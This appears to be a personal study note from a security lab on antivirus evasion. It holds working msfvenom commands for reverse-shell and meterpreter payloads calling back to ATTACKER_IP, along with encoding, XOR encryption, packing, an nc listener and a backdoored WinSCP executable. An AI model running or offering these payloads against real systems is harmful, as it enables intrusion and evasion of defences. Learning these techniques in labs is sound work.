---
dg-publish: true
---






## ==Stageless Payloads==

- Embeds the final shellcode directly into itself.
- After the program is executed, the embedded shellcode will run, providing a reverse shell to the attacker.

## ==Staged Payloads==

- Work by using intermediary shellcodes called stager, provides a means to retrieve the final shellcode.

## ==Stagers in msf==

### Stageless

```C#
windows/x64/shell_reverse_tcp
```

### Staged

```C#
windows/x64/shell/reverse_tcp
```

- Refer to csharp_workshop for more payloads.x

## ==Using stager to run a reverse shell==

```Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7474 -f raw -o shellcode.bin -b '\x00\x0a\x0d'
```

- After this, setup up a HTTPS server.

```Shell
openssl req -new -x509 -keyout localhost.pem -out localhost.pem -days 365 -nodes
```

- After this, spawn a simple HTTPS server with py3.

```Shell
python3 -c "import http.server, ssl;server_address=('0.0.0.0',443);httpd=http.server.HTTPServer(server_address,http.server.SimpleHTTPRequestHandler);httpd.socket=ssl.wrap_socket(httpd.socket,server_side=True,certfile='localhost.pem',ssl_version=ssl.PROTOCOL_TLSv1_2);httpd.serve_forever()"
```

- Set up an nc listener to receive the reverse shell on the same port specified when running msfvenom

```Shell
nc -lvp 7474
```

## ==Encoding==

- Listing encoders with msfvenom

```Shell
msfvenom --list encoders | grep excellent
```

- Choose shikata_ga_nai and then specify the payload three times with -i.

```Shell
msfvenom -a x86 --platform Windows LHOST=ATTACKER_IP LPORT=443 -p windows/shell_reverse_tcp -e x86/shikata_ga_nai -b '\x00' -i 3 -f csharp
```

## ==Encryption==

```Shell
msfvenom --list encrypt
```

- Build an XOR encrypted payload. Specify a key.

```Shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=7788 -f exe --encrypt xor --encrypt-key "MyZekr3tKey***" -o xored-revshell.exe
```

## ==Packing & Unpacking==

- generate a new shellcode and put it into the `shellcode` variable of the code

```Shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=7478 -f csharp
```

- After this, compile the program

```Shell
csc UnEncStagelessPayload.cs
```

- Use ConfuserEx for packing.

## ==Binding==

- Bind a payload with the application executable with msfvenom.
- For this task, backdoor WinSCP executable available.

```Shell
msfvenom -x WinSCP.exe -k -p windows/shell_reverse_tcp lhost=ATTACKER_IP lport=7779 -f exe -o WinSCP-evil.exe
```

- Binders won't do much to hide your payload from an AV solution. The simple fact of joining two executables without any changes means that the resulting executable will still trigger any signature that the original payload did.